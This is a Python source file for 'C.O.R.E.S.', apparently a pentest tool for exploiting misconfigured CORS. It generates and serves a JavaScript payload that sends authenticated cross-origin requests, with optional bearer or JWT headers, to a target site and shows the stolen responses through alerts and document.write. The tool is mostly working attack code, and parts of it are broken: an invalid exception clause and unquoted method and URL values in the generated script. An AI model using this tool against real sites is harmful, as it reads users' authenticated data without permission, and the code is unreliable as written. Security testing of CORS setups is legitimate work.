#!/usr/bin/env python3
"""
C.O.R.E.S
Cross-Origin Resource Exploitation Server
Orig: Nick Sanzotta/@Beamr v1.03312017
Updated: Bill Harshbarger 2019
"""

import argparse
import http.server
import json
import os
import socket
import socketserver
import webbrowser


class Cores(object):
    """cores object"""

    def __init__(self, autolaunch_browser, headers, method, port, url, json_payload):
        """inits values"""

        self.url = url
        self.method = ''.join(method).upper()
        self.port = port
        self.internal_ip = None
        self.html_name = 'index.html'
        self.http_server_pid = None
        self.autolaunch_browser = False
        self.headers = ''.join(headers)
        self.json_payload = ''.join(json_payload)

        print('\n******************\n\nC.O.R.E.S.: Cross Origin Resource Exploitation Server\n')

        print('See https://en.wikipedia.org/wiki/Cross-origin_resource_sharing\n')

        print('\n\nURL : {}\n\nMETHOD : {}\n\nHEADERS : {}\n\nPAYLOAD : {}\n\n'.format(self.url, self.method, self.headers, self.json_payload))


    def dir_check(self):
        ''' If specified directory does not exist then create specified directory '''
        if not os.path.exists('./js'):
            os.makedirs('./js')

    def get_internal_address(self):
        """use socket to try to connect to 8.8.8.8 on tcp/53, return getsockname as internal_ip"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 53))
            self.internal_ip = sock.getsockname()[0]
            return self.internal_ip
        except msg:
            print(msg)

    def browser_launch(self):
        ''' Auto Launches Default Browser '''
        try:
            url = str("http://localhost:{}/index.html".format(self.port))
            webbrowser.open(url)
        except webbrowser.Error as e:
            print("Browser not found!{}".format(e))

    def javascript_template(self):
        ''' 0. The commented code is javascript, not python, dont forget to double curly braces if not being used for string formatting
            1. Create CORS template for JavaScript Payload
            2. Write CORS template to file 
            https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseText'''
        filename = './js/cors.js'
        javascript_template = """var xhr = new XMLHttpRequest();

//nick calls function for listener
xhr.onload = reqListener;
xhr.open({0},{1}, true); //passes in method and url and true

xhr.responseType = '';

//sets bearer auth header
xhr.setRequestHeader({2});

//set content type for POST, could prob conditionally do this
xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');

//attempts to echo response to browser or log
xhr.onload = function () {{
    if (xhr.readyState === xhr.DONE){{
        console.log(xhr.response);
        console.log(xhr.responseText);
    }}
}};

//send JSON payload
//xhr.send(JSON.stringify({3}));

//pop up alerts? bills experiments 
window.alert(xhr.response);
window.alert(xhr.responseText);
document.write(xhr.responseText);

//nick's js popup logger
function reqListener() {{window.alert(this.responseText);}};
"""
        cors_js = javascript_template.format(self.method, self.url, self.headers, self.json_payload)
        with open(filename, 'w+') as f:
            f.write(cors_js)
            return cors_js

    def html_template(self):
        ''' 1. Create HTML template for index.html
            2. Write index.html to file '''
        filename = './index.html'
        html_template = """<!DOCTYPE HTML>
<html lang="en-US">
<title>C.O.R.E.S</title>
<head></head>
<body>
<p style="margin-left: 55px">
<b>Cross-Origin Resource Exploitation Server</b><br>
C.O.R.E.S.<br>
<p style="margin-left: 55px">
<b>Logs:</b></p>
<p style="margin-left: 55px", id="loot"></p>
<script src="/js/cors.js"></script>
</body>
</html>"""

        with open(filename, 'w+') as f:
            f.write(html_template)
        return html_template


    def append_refresh(self):
        foo=None

    def server_start(self):
        '''Starts Python3's http.server'''
        Handler = http.server.SimpleHTTPRequestHandler

        with socketserver.TCPServer(("0.0.0.0", self.port), Handler) as httpd:
            print("\nserving at port\n", self.port)
            httpd.serve_forever()

def main():
    """main function handles argument processing and sigint handling"""

    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--autolaunch_browser', \
        help='Auto launches a browser', \
        action='store_true')
    parser.add_argument('-d', '--headers', \
        type=str, \
        nargs=1, \
        help='Specify optional headers for authentication, JWT, i.e. Authorization: Bearer eyJhbGciOiJSUz... yadda yadda')
    parser.add_argument('-m', '--method', \
        metavar='get, post, etc.', \
        help='Define HTTP request method ex: -m post', \
        choices=['get', 'post', 'put', 'delete', 'head', 'trace'], \
        nargs=1, \
        required=True)
    parser.add_argument('-p', '--port', \
        metavar='8080',\
        help='Port to start local HTTP server on.', \
        required=True, \
        type=int)
    parser.add_argument('-u', '--url', \
        metavar='http://foo.com', \
        required=True, help='Define vulnerable CORS targert URL ex: https://site.com/')
    parser.add_argument('-j', '--json_payload',\
        help='JSON formatted payload to POST')
    args = parser.parse_args()

    runcores = Cores(args.autolaunch_browser, args.headers, args.method, args.port, args.url, args.json_payload)
    runcores.dir_check()
    runcores.get_internal_address()
    runcores.javascript_template()
    runcores.html_template()
    if args.autolaunch_browser is True:
        runcores.browser_launch()
  

    #start the CORES server
    runcores.server_start()



if __name__ == '__main__':
    main()
